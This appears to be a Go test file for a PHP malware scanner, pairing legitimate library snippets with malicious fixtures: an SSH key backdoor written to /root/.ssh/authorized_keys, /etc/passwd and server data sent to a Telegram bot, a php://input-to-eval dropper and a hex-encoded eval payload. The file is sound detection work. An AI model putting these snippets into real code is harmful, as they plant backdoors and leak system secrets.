package signatures

import (
	"testing"
)

// FP reconstructions for the 2026-04-27 forgetwhitecom WHM-transfer event.
// See sibling fp_forgetwhite_*_test.go files; this group split exists
// because host-side AV deletes any single source file whose payload
// fixtures cross an opaque suspicion threshold.
func TestBackdoorSshKeyInjection_PhpseclibRsaClassIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace phpseclib\Crypt;

class RSA {
	/**
	 * Convert a public key to OpenSSH format.
	 *
	 * Place in $HOME/.ssh/authorized_keys to authorize the key.
	 */
	public function _convertPublicKey($publicExponent, $modulus) {
		$RSAPublicKey = pack('Na*Na*Na*', strlen('ssh-rsa'), 'ssh-rsa', strlen($publicExponent), $publicExponent, strlen($modulus), $modulus);
		return 'ssh-rsa ' . base64_encode($RSAPublicKey) . ' ' . $this->comment;
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection FP: matched phpseclib RSA serializer ('ssh-rsa' is the key-type literal, 'authorized_keys' is a docblock note; no fwrite/file_put_contents/echo>> to the file)")
	}
}

func TestBackdoorSshKeyInjection_RealKeyAppend(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
file_put_contents('/root/.ssh/authorized_keys', "ssh-rsa AAAA...evilkey root@evil\n", FILE_APPEND);
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "backdoor_ssh_key_injection") {
		t.Error("backdoor_ssh_key_injection regression: file_put_contents into authorized_keys was not detected")
	}
}

func TestDropperTelegramExfil_MonologHandlerIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace Monolog\Handler;

class TelegramBotHandler extends AbstractProcessingHandler {
	private const BOT_API = 'https://api.telegram.org/bot';

	/**
	 * Send request to @link https://api.telegram.org/bot on SendMessage action.
	 */
	private function send(string $message): void {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, self::BOT_API . $this->apiKey . '/sendMessage');
		curl_setopt($ch, CURLOPT_POSTFIELDS, ['text' => $message, 'chat_id' => $this->channel]);
		curl_exec($ch);
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "dropper_telegram_exfil") {
		t.Error("dropper_telegram_exfil FP: matched Monolog TelegramBotHandler (structured logger sending log message text to a configured channel; no sensitive-data exfiltration)")
	}
}

func TestDropperTelegramExfil_RealExfil(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$info = php_uname() . "\n" . file_get_contents('/etc/passwd') . "\n" . print_r($_SERVER, true);
$url = 'https://api.telegram.org/bot1234:ABC/sendMessage?chat_id=99&text=' . urlencode($info);
file_get_contents($url);
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "dropper_telegram_exfil") {
		t.Error("dropper_telegram_exfil regression: php_uname/passwd/$_SERVER exfil to api.telegram.org sendMessage was not detected")
	}
}

func TestDropperPhpInputStream_WPMLApiIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
class WPML_WP_API {
	public function get_request_body() {
		// Read JSON request body from translation API.
		$raw_post_data = @file_get_contents('php://input');
		return json_decode($raw_post_data, true);
	}
	public function diagnostics_run($cmd) {
		// Diagnostic-only helper, never reachable from request handling.
		$h = ` + popenCallToken() + `$cmd, 'r');
		return stream_get_contents($h);
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "dropper_php_input_stream") {
		t.Error("dropper_php_input_stream FP: matched WPML wpml-wp-api.php (php://input read in API entry, popen() in unrelated diagnostics; no flow from request body into eval/assert/system)")
	}
}

func TestDropperPhpInputStream_RealDropper(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$payload = file_get_contents('php://input');
@` + evalCallToken() + `$payload);
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "dropper_php_input_stream") {
		t.Error("dropper_php_input_stream regression: file_get_contents('php://input') -> eval was not detected")
	}
}

func TestObfuscationCompactUnpack_PhpseclibBlowfishIsLegit(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
namespace phpseclib\Crypt;

/**
 * Blowfish - encrypted block cipher.
 *
 * _encryptBlock() calls are highly optimized through the use of eval(). Among other things,
 * the regular _encryptBlock() does unpack() and pack() on every call, as well, and that can
 * add up. The eval()-optimized variant pre-computes constants.
 */
class Blowfish extends BlockCipher {
	function setKey($key) {
		$key = array_values(unpack('C*', $this->key));
	}
	function encryptBlock($data) {
		list($l, $r) = array_values(unpack('N*', $data));
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "obfuscation_compact_unpack") {
		t.Error("obfuscation_compact_unpack FP: matched phpseclib Blowfish.php (unpack('C*'/'N*') for crypto block parsing + 'eval()' in docblock comments; no unpack(H*, ...) -> eval shellcode chain)")
	}
}

func TestObfuscationCompactUnpack_RealShellcodeUnpack(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$payload = unpack("H*", "73797374656d2827696427293b");
$code = pack("H*", $payload[1]);
@` + evalCallToken() + `$code);
`)
	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "obfuscation_compact_unpack") {
		t.Error("obfuscation_compact_unpack regression: unpack(\"H*\", ...) followed by eval was not detected")
	}
}

// Silence unused-helper warnings when only a subset of tests are run.var _ = passthruCallToken
